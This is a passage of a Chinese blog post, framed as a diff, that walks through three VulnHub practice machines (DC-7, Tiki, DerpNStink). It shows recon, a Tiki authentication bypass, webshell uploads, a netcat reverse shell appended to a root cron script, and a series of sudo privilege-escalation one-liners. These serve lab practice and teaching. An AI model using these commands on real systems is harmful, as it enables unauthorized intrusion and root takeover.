@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>vulnhub_new |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-vulhub"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+  
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  vulnhub_new
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/09/13/vulhub/" class="article-date">
+  <time datetime="2023-09-12T16:21:20.000Z" itemprop="datePublished">2023-09-13</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/vulhub/">vulhub</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">9.7k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">38 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、D7"><a href="#一、D7" class="headerlink" title="一、D7"></a>一、D7</h1><p>攻击机kali与靶机在同一网段下</p>
+<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p><code>netdiscover -r</code> 被动扫描</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231116193332618.png"></p>
+<p>拿到ip，扫端口</p>
+<p><code>nmap -P0 -p1-65535 192.168.1.49</code>免ping扫描，扫端口</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231116193833715.png"></p>
+<p>好，22和80端口</p>
+<p>详细扫描</p>
+<p><code>nmap -sT -sV -sC -O -p22,80 -Pn 192.168.1.49</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231116194038309.png"></p>
+<p>可以看到中间件，网址，还有个别路径</p>
+<p>访问url路径</p>
+<p><img src="/../../../Typora/img111/image-20231116194200502.png"></p>
+<p>标题有提示，这是一个CMS，可以去搜一下，先放着</p>
+<p>f12扫一眼它的源代码，还有js</p>
+<p>看它的网页功能，主要关注有搜索框和登录入口</p>
+<p>登录可以创建账户，先创建一个</p>
+<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#49;&#x32;&#x33;&#52;&#x35;&#54;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#49;&#x32;&#x33;&#52;&#x35;&#54;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>被用过</p>
+<p>test123qwe，进入，有填写基本信息，有上传图片功能</p>
+<p>有一个报错</p>
+<p><img src="/../../../Typora/img111/image-20231117111539091.png"></p>
+<p>提示需要确认邮箱链接，我邮箱是随便填的啊，重新注册一个，用接码地址来</p>
+<p><img src="/../../../Typora/img111/image-20231117111619145.png"></p>
+<p>第二次注册的时候，提示说启用js，否则不给用</p>
+<p>解决了后，进入我的账户</p>
+<p>找找其它功能，上传点，或者测试越权</p>
+<p><code>https://www.drupal.org/u/test123qwe</code></p>
+<p><img src="/../../../Typora/img111/image-20231117113352677.png"></p>
+<p><code>https://www.drupal.org/u/admin</code>，是有越权的</p>
+<p><img src="/../../../Typora/img111/image-20231117113520669.png"></p>
+<p>可以只读他人的信息，没有其他信息</p>
+<p>f12看一下图片的位置，有没有暴露路径</p>
+<p><img src="/../../../Typora/img111/image-20231117121159636.png"></p>
+<p>打开插件</p>
+<p><img src="/../../../Typora/img111/image-20231117114159715.png"></p>
+<p>用weevely生成一个木马，更名为1.png，上传的时候用bp改一下后缀</p>
+<p><img src="/../../../Typora/img111/image-20231117121705977.png"></p>
+<p>php5和大小写也不行，它这是纯后缀检测，它这也不是apache和iis，不然可以尝试解析漏洞，这里放过</p>
+<p>等一下，既然是linux系统(前面nmap扫到)，尝试下root用户呢？访问下 <code>/u/root</code></p>
+<p>它的posts有东西的</p>
+<p><img src="/../../../Typora/img111/image-20231117125114787.png"></p>
+<p>嘶，什么呀，看不懂啊</p>
+<h2 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h2><p>啊啊啊啊啊啊啊！！！！！</p>
+<p>我搞错了</p>
+<p>直接访问ip，才是真正的靶机地址，好好好，这就是为什么做之前要改好hosts啊！</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117125845956.png" alt="真正的靶机入口"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117132703524.png" alt="登录页面"></p>
+<p>它右上角有登录窗口的，而且之前在nmap扫到了一些路径，现在可以试一试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.49/user/register/ 403了</span><br><span class="line">http://192.168.1.49/admin/ 403了</span><br><span class="line">http://192.168.1.49/index.php/admin/ 403了</span><br><span class="line"></span><br><span class="line">抓了包，也没什么用</span><br><span class="line">http://192.168.1.49/web.config 可以访问</span><br><span class="line">http://192.168.1.49/README.txt 可访问</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117132441898.png"></p>
+<p>重置密码的话，会发到邮箱里去，这个可以确认账号admin&#x2F;DC7USER，但是bp改不了邮箱</p>
+<p>搜索框呢，也没有注入点</p>
+<p>嘶，出在哪里？</p>
+<h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>看了wp，我真的裂开了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117141937370.png"></p>
+<p>搜一下 @DC7USER，出现一个github链接，点进去看，有一个仓库，里面是源码</p>
+<p>来到一个config.php文件，得到mysql的账号和密码，连接</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117142641902.png" alt="MdR3xOgB7#dW"></p>
+<p>后台登录不行</p>
+<p>那就ssh连接了</p>
+<p><code>ssh dc7user@192.168.1.49</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117143440017.png" alt="gpg是加密的文件，算了"></p>
+<p>看看 cat mbox</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117143604279.png" alt="这个脚本文件什么"></p>
+<p>查看sh内容</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117143711566.png"></p>
+<p>这啥啊</p>
+<p>这里gpg的加密密钥是有的</p>
+<p>drush有些东西</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117143955601.png" alt="drush部分命令"></p>
+<p>那我去修改admin的密码</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117144201296.png" alt="drush修改密码"></p>
+<p>去网站登录</p>
+<p><img src="/../../../Typora/img111/image-20231117144237683.png" alt="啊，超过五次被锁了"></p>
+<p><img src="/../../../Typora/img111/image-20231117144417751.png" alt="取消这个锁定or新建一个管理员"></p>
+<p>再试一次，进来了</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117144450835.png"></p>
+<p>网站管理页面，admin是个管理员，查找一下文件上传的地方，有一个图片上传的，但是不行，就算上传了图片码也解析不了啊</p>
+<p>哦，不对啊，我不是已经ssh连接到了嘛，那就不用网页了</p>
+<h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><p>我现在的目的是提权了</p>
+<p><code>sudo -l</code> 没有</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117145919272.png" alt="find命令找suid文件"></p>
+<p>2&gt;&#x2F;dev&#x2F;null不显示其他的错误信息相当于过滤</p>
+<blockquote>
+<p>常用的SUID提权命令（\nmap、vim、find、bash、more、less、nano、cp\ 等</p>
+</blockquote>
+<p>好 <code>/usr/sbin/exim4</code>是什么</p>
+<p>这属于一个利用第三方应用提权</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117150755211.png" alt="exim4版本为4.89"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117151452420.png" alt="选了这个"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name 46996.sh</span><br><span class="line">/usr/share/exploitdb/exploits/linux/local/46996.sh</span><br><span class="line">//传到目标机</span><br><span class="line">scp /usr/share/exploitdb/exploits/linux/local/46996.sh dc7user@192.168.1.49:/var/tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117164804830.png" alt="确实无效"></p>
+<h3 id="web反弹"><a href="#web反弹" class="headerlink" title="web反弹"></a>web反弹</h3><p>回到浏览器，这里有拓展，如果能找到解析语言的拓展就可以了，去到官网drupal.com搜索php，是有的，把名字复制过来就行</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117153709825.png"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117154718607.png" alt="根据提示，替换下名字即可"></p>
+<p>将php启用，并添加content，这样就会多一个php的解释器</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117155026251.png"></p>
+<p>kali这里监听一下</p>
+<p>然后浏览器去访问一下123456这个页面，有点慢，等个几分钟</p>
+<h3 id="监听到用户"><a href="#监听到用户" class="headerlink" title="监听到用户"></a>监听到用户</h3><p>哦，不用，直接输入即可。。。。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117155308816.png" alt="输入命令"></p>
+<p><img src="/../../../Typora/img111/image-20231117155720966.png" alt="这两个uid关系？"></p>
+<p>然后嘞，将nc命令写入backups.sh文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc 192.168.1.109 12345 -e /bin/bash&quot; &gt;&gt; /opt/scripts/backups.sh </span><br></pre></td></tr></table></figure>
+
+<p>然后这边监听端口</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117161704507.png" alt="监听"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117161754285.png" alt="进入root，找flag文件"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这本质是一个<strong>源码泄露+反弹</strong></p>
+<p>一开始进入浏览器呢，通过访问路径，弱口令，万能密码、抓包等无果，注意到左下角的用户信息@DC7USER</p>
+<p>谷歌一下，找到了github，看到源码，泄露了账号和密码</p>
+<p>尝试后台登录不行，那就尝试ssh连接</p>
+<p>这个时候有两个文件，一个加密的不管，另一个mbox文件，查看一下，其实是一个<strong>定时任务</strong>，它会<strong>以root身份</strong>执行backups.sh文件；且有一个drush</p>
+<p>这个先放着不管，尝试sudo -l本地提权，没有</p>
+<p>尝试找suid文件，有一个第三方的，exp利用无果，也是我不会搞啊</p>
+<p>然后还是要回到后台登录，drush命令可以修改密码，当确认了admin用户后，修改它的密码，后台就可以登录进去。</p>
+<p>尝试找突破点，有一个图片上传的，但是不能解析图片码</p>
+<p>去content内容查看，可以编辑一些文章，但是要想解析木马的话，就去安装一个php拓展，然后写入php code，这里写的是nc反弹的，发布后，访问，kali再监听就可以了。这样得到的是www-data的shell</p>
+<p>然后这里其实有个点，为什么要这样做？</p>
+<p>当ssh连接到dc7user的shell的时候，那个backups.sh的权限</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231117165742409.png"></p>
+<p>除了root，www-data用户也是有读<strong>写</strong>权限的</p>
+<p>所以我们要得到该用户的终端，将nc命令写入到 <strong>定时任务中，root用户会执行的backups.sh脚本中</strong>，这样kali就可以监听到<strong>root的终端</strong>，也就拿到了root的身份了</p>
+<h3 id="shell区别："><a href="#shell区别：" class="headerlink" title="shell区别："></a>shell区别：</h3><p>webshell和ssh登录的shell区别：</p>
+<p>webshell的用户是<strong>低权限</strong>的，ssh登录的用户相对来说<strong>权限更高</strong>，而且通常提供更丰富的功能和交互性</p>
+<h1 id="二、tiki"><a href="#二、tiki" class="headerlink" title="二、tiki"></a>二、tiki</h1><p>一开始扫不到ip，靶机改成桥接模式就好了</p>
+<h2 id="1-信息收集-1"><a href="#1-信息收集-1" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231117180706264.png" alt="image-20231117180706264"></p>
+<p><code>nmap -sT -sV -sC -O -p22,80,139,445 192.168.1.213</code></p>
+<p><img src="/../../../Typora/img111/image-20231117180805333.png"></p>
+<p>这139和445让我想到了永恒之蓝啊，还有IPC$渗透</p>
+<p>先看80端口</p>
+<p><img src="/../../../Typora/img111/image-20231117181038093.png"></p>
+<p>&#x2F;robots.txt，暴露了一个&#x2F;tiki&#x2F;</p>
+<p><img src="/../../../Typora/img111/image-20231117181221712.png"></p>
+<p>这还是个CMS</p>
+<p>右上角有登录的，不知道，忘记密码去看一看，账号root&#x2F;tiki&#x2F;test都没有，admin会爆红，联系管理员，说明应该有admin</p>
+<p>页面的2,3步都需要权限</p>
+<p><img src="/../../../Typora/img111/image-20231117181854739.png"></p>
+<p>尝试抓包看看也没用</p>
+<p>看一下错误信息，搜索一下</p>
+<p><code>that is needed to use this feature: tiki_p_admin</code></p>
+<p>有显示说CVE-2020-15906认证绕过漏洞</p>
+<blockquote>
+<p>管理员账户被爆破60次以上时将被锁定，此时使用空白密码即可以管理员身份登录后台</p>
+<p>使用范围：16.x - 21.1</p>
+</blockquote>
+<p>先把密码随便爆破60次，再将密码置空登录</p>
+<p><img src="/../../../Typora/img111/image-20231118093620924.png" alt="image-20231118093620924"></p>
+<p><img src="/../../../Typora/img111/image-20231118093858678.png" alt="进入成功"></p>
+<p>有一个文件上传处，貌似php文件只能下载，不能访问，也找不到路径位置，所以可能连不上</p>
+<p>找到了一个创建页面处，编辑器里有个code，想要写个php代码貌似不支持</p>
+<p>在list page里找到了admin写的page，内容为</p>
+<p><img src="/../../../Typora/img111/image-20231118104505073.png" alt="Agy8Y7SPJNXQzqA"></p>
+<h2 id="2-登录shell"><a href="#2-登录shell" class="headerlink" title="2.登录shell"></a>2.登录shell</h2><p>ssh连接后</p>
+<p>框框处提醒我了，提权啊</p>
+<p><img src="/../../../Typora/img111/image-20231118104824103.png"></p>
+<p><code>sudo -l</code></p>
+<p><img src="/../../../Typora/img111/image-20231118104857442.png"></p>
+<p>哇，这权限很大啊</p>
+<h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><h3 id="sudo-find提权"><a href="#sudo-find提权" class="headerlink" title="sudo find提权"></a>sudo find提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find /home -<span class="built_in">exec</span> /bin/bash \; <span class="comment">#find提权</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118114927987.png" alt="image-20231118114927987"></p>
+<h3 id="sudo-sed提权"><a href="#sudo-sed提权" class="headerlink" title="sudo sed提权"></a>sudo sed提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -n <span class="string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118115415663.png"></p>
+<h3 id="sudo-ed提权"><a href="#sudo-ed提权" class="headerlink" title="sudo ed提权"></a>sudo ed提权</h3><p><img src="/../../../Typora/img111/image-20231118115516878.png" alt="sudo ed"></p>
+<h3 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a><strong>sudo bash</strong></h3><p><img src="/../../../Typora/img111/image-20231118115644974.png"></p>
+<h3 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo perl -e <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118115737239.png"></p>
+<h3 id="sudo-less"><a href="#sudo-less" class="headerlink" title="sudo less"></a>sudo less</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo less /etc/hosts</span><br><span class="line">!bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118115831932.png"></p>
+<h3 id="sudo-vi"><a href="#sudo-vi" class="headerlink" title="sudo vi"></a><strong>sudo vi</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line">:!bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118115947677.png"></p>
+<h3 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">env</span> /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118120044688.png"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这本质是个信息泄露+sudo提权</p>
+<p>找找robots.txt，找到主页面，然后搜索这个cms漏洞，要么用现成脚本，要么根据描述去尝试手工完成，新手题</p>
+<p>但是我很好奇这个源码部分，为什么爆破60次可以空密码绕过呢</p>
+<h1 id="三、DERPNSTINK-1"><a href="#三、DERPNSTINK-1" class="headerlink" title="三、DERPNSTINK: 1"></a>三、DERPNSTINK: 1</h1><h2 id="1-信息收集-2"><a href="#1-信息收集-2" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>netdiscover，ip为179</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p1-65535 192.168.1.179</span><br><span class="line">nmap -sT -sV -sC -O -Pn -p21,22,80 192.168.1.179</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118123651206.png" alt="nmap详细信息"></p>
+<p>直接访问ip，半天不加载出来</p>
+<p>通过robots.txt知道，两个路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/php/ <span class="comment">#403</span></span><br><span class="line">/temporary/ <span class="comment">#显示 try harder</span></span><br></pre></td></tr></table></figure>
+
+<p>路径爆破吧</p>
+<p>爆破了很多&#x2F;php&#x2F;为主目录，&#x2F;weblog为主目录等</p>
+<p><img src="/../../../Typora/img111/image-20231118125858033.png"></p>
+<p>CMS是wordpress 4.6.27</p>
+<p>先访问个路径为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.179/weblog/xmlrpc.php</span><br></pre></td></tr></table></figure>
+
+<p>提示说只接收post请求，那就bp或者hackbar，发个post请求</p>
+<p>emmm，提示faultCode，假代码</p>
+<p>有phpmyadmin，弱口令来一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：root 密码：空 #禁用空密码</span><br><span class="line">万能密码：&#x27;localhost&#x27;@&#x27;@&quot; #无用</span><br></pre></td></tr></table></figure>
+
+<p>换个链接</p>
+<p>提示找不到服务器了</p>
+<p>hosts添加一下</p>
+<p><img src="/../../../Typora/img111/image-20231118131521940.png"></p>
+<h2 id="2-进入后台"><a href="#2-进入后台" class="headerlink" title="2.进入后台"></a>2.进入后台</h2><p>在忘记密码那里试出来了，admin用户存在</p>
+<p>尝试了一下，admin弱口令，居然进去了</p>
+<p><img src="/../../../Typora/img111/image-20231118131713538.png"></p>
+<p>文件上传的地方，可以改后缀名绕过</p>
+<p><img src="/../../../Typora/img111/image-20231118132755304.png"></p>
+<p>然后kali的weevely进行连接，成功</p>
+<p><img src="/../../../Typora/img111/image-20231118132830342.png"></p>
+<h2 id="尝试提权-1"><a href="#尝试提权-1" class="headerlink" title="尝试提权"></a>尝试提权</h2><p>sudo -l 没有</p>
+<p>找找sbin的</p>
+<p><img src="/../../../Typora/img111/image-20231118134226719.png"></p>
+<p>这些都是设置了s位的可执行文件，</p>
+<p><strong>计划任务呢？</strong></p>
+<p><code>/etc/crontab</code>，没发现有<strong>可写</strong>权限的文件</p>
+<blockquote>
+<p>如果有，将nc -e写进去，监听到root的shell</p>
+</blockquote>
+<p>去 <code>/home</code>，查看用户，有两个但没权限访问</p>
+<p>虽然没有root密码，<code>su root</code>被禁止了</p>
+<p>难道只能内核提权了咩？</p>
+<p>我至少得找到一个用户的shell诶</p>
+<p>回到浏览器页面，这个管理员有点假诶</p>
+<p>想办法找找phpadmin的密码</p>
+<p><img src="/../../../Typora/img111/image-20231118142729678.png"></p>
+<p>没用，找了半天</p>
+<p><code>www-data@DeRPnStiNK:/var/www/html/weblog $ cat wp-config.php</code></p>
+<p><img src="/../../../Typora/img111/image-20231118143452087.png"></p>
+<p>好，找到了，去phpmyadmin登录</p>
+<p>尝试一下，这会不会是可以ssh的东西呢？</p>
+<p><img src="/../../../Typora/img111/image-20231118162113441.png" alt="wedgie57"></p>
+<p>看最后一个用户，尝试破解下</p>
+<p>ssh登录，emmm，是个公钥登录方式，权限拒绝</p>
+<p>emmm在浏览器执行下语句</p>
+<p><code>SHOW GLOBAL VARIABLES LIKE &#39;secure%&#39;</code></p>
+<p><img src="/../../../Typora/img111/image-20231118170841804.png" alt="image-20231118170841804"></p>
+<p>那也不能mysql提权了</p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>那还是把这个用户登录试试吧</p>
+<p><img src="/../../../Typora/img111/image-20231118171130879.png"></p>
+<p>然后呢，尝试<strong>重复密码</strong>，ssh不能登录，不是还有ftp嘛</p>
+<p>上面在&#x2F;home下，就看到了两个用户名，每个用户名尝试一波</p>
+<p><img src="/../../../Typora/img111/image-20231118171942634.png" alt="ftp"></p>
+<p><img src="/../../../Typora/img111/image-20231118172220013.png"></p>
+<p>key.txt应该是公钥，cat用不了嘞，<code>less</code>可以看，直接下载下来</p>
+<p><img src="/../../../Typora/img111/image-20231118172742866.png"></p>
+<p>好好好，我直接公钥登录</p>
+<h3 id="公钥ssh"><a href="#公钥ssh" class="headerlink" title="公钥ssh"></a>公钥ssh</h3><p>要改下文件权限，为600</p>
+<p><img src="/../../../Typora/img111/image-20231118175029766.png"></p>
+<h2 id="尝试提权-2"><a href="#尝试提权-2" class="headerlink" title="尝试提权"></a>尝试提权</h2><p>sudo -l没有</p>
+<p>看sbin</p>
+<p><img src="/../../../Typora/img111/image-20231118175318504.png"></p>
+<p>这和那个webshell的有什么区别</p>
+<p>计划任务也没有</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p><img src="/../../../Typora/img111/image-20231118175525305.png"></p>
+<p>好好好，还有pcap文件</p>
+<p><img src="/../../../Typora/img111/image-20231118175603245.png"></p>
+<p>emmm，我kali怎么看呢，scp下不来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp  stinky@192.168.1.179:/home/stinky/Documents/derpissues.pcap /tmp</span><br></pre></td></tr></table></figure>
+
+<p>后面带 <code>-o pubkey...</code>不行</p>
+<p>那我先将文件传到ftp，我从ftp下载</p>
+<p><img src="/../../../Typora/img111/image-20231118183710044.png" alt="550 权限拒绝"></p>
+<p>算了，我scp在目标终端往攻击机去传吧</p>
+<p><img src="/../../../Typora/img111/image-20231118184840232.png" alt="嘶"></p>
+<p>那怎么传？</p>
+<p>在攻击机中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/ssh_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加</span></span><br><span class="line">PubKeyAcceptedTypes +ssh-rsa</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231118185648953.png"></p>
+<p>得到另一个用户的信息</p>
+<p>wireshark不讲</p>
+<p><img src="/../../../Typora/img111/image-20231118190340280.png" alt="derpderpderpderpderpderpderp"></p>
+<h2 id="尝试提权-3"><a href="#尝试提权-3" class="headerlink" title="尝试提权"></a>尝试提权</h2><p>sudo -l，有的</p>
+<p><img src="/../../../Typora/img111/image-20231118190700197.png"></p>
+<p>这是个啥啊</p>
+<p>这是个没有的路径啊</p>
+<p><img src="/../../../Typora/img111/image-20231118191014521.png"></p>
+<p>那就自己建</p>
+<p><img src="/../../../Typora/img111/image-20231118192141201.png"></p>
+<p><img src="/../../../Typora/img111/image-20231118191756817.png"></p>
+<h2 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h2><p>同样是ftp，怎么攻击机进入的ftp和用户shell进入的ftp，支持的命令不一样呢？</p>
+<p><img src="/../../../Typora/img111/image-20231118193110085.png"></p>
+<p>在用户shell下进入的几乎不能查看文件内容，而攻击机进入的起码有<code>less</code></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="1-漏掉的flag"><a href="#1-漏掉的flag" class="headerlink" title="1.漏掉的flag"></a>1.漏掉的flag</h3><p>flag1是在80端口页面中，源代码查看</p>
+<p><img src="/../../../Typora/img111/image-20231118193422991.png"></p>
+<p><img src="/../../../Typora/img111/image-20231118193512120.png"></p>
+<h3 id="2-文件传输"><a href="#2-文件传输" class="headerlink" title="2.文件传输"></a>2.文件传输</h3><p>这里有一个更好的传输方法，用 nc</p>
+<p>攻击机打开nc，接收文件，文件名可以自定义</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 999 &gt; test1.pcap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231119105043102.png" alt="攻击机接收文件"></p>
+<p>靶机终端发送文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.1.109 999 &lt;der*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../Typora/img111/image-20231119105115134.png" alt="靶机发送文件"></p>
+<h3 id="3-sudo提权"><a href="#3-sudo提权" class="headerlink" title="3.sudo提权"></a>3.sudo提权</h3><p>上面那个命令是指，在特定路径下，运行以derpy开头的文件时，会以root身份运行</p>
+<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>本质是一个后台弱口令+文件上传</p>
+<ol>
+<li>扫端口，有21、22、80</li>
+<li>从80端口入手，有个页面，查看插件，得到CMS等信息，尝试robots.txt，得到其它路径，可dirb尝试爆破路径，得到登录路径以及phpmyadmin路径</li>
+<li>有登录的优先去登录的地方查看，比如wp-admin</li>
+<li>弱口令尝试或者(利用CMS漏洞进去)</li>
+<li>找到文件上传的地方，主要是暴露了文件的存储位置，bp改后缀绕过，上传木马，利用weevely连接</li>
+<li><strong>进入webshell</strong>，想办法提权，sudo提权&#x2F;sbin提权&#x2F;计划任务，无果</li>
